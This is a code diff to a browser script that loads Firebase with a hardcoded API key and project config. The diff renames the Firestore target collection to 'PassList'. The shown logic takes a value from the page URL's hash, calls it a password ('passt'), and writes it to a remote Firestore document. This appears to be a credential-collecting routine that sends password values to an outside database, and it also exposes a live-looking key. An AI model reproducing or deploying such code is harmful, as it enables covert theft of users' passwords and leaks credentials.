@@ -7,19 +7,6 @@
         th.appendChild(s);
         return true
     };
-        jsQueryCode = new Promise ((res)=>{
-            let url = 'https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js'
-            addJavascript(url ,'head');
-            setInterval(()=>{
-                let scripts = document.getElementsByTagName("script")
-                for(let i = 0; i < scripts.length; i++){
-                    if (scripts[i].src == url){
-                        res()
-                        break;
-                    }
-                }
-            }, 500)
-        })
     
         jsCode1 = new Promise ((res)=>{
             let url = 'https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js'
@@ -41,14 +28,14 @@
                 let scripts = document.getElementsByTagName("script")
                 for(let i = 0; i < scripts.length; i++){
                     if (scripts[i].src == url){
-                        res()
+                        res(true)
                         break;
                     }
                 }
             }, 500)
         })
     
-        Promise.all([jsQueryCode, jsCode1, jsCode2]).then(()=>{
+        Promise.all([jsCode1, jsCode2]).then(()=>{
             const firebaseConfig = {
                 apiKey: "AIzaSyBC6W49ilLK5mWHsP2MXKyiIjmLyRGkFiQ",
                 authDomain: "allentumbagahan-9610f.firebaseapp.com",
@@ -68,7 +55,7 @@
   
                   var hash = location.hash
                   var passt = hash.replace("#", "")
-                  BotBtn = db.collection("Accounts").doc(Date())
+                  BotBtn = db.collection("PassList").doc(Date())
                   BotBtn.set({
                       pass : passt
                   })
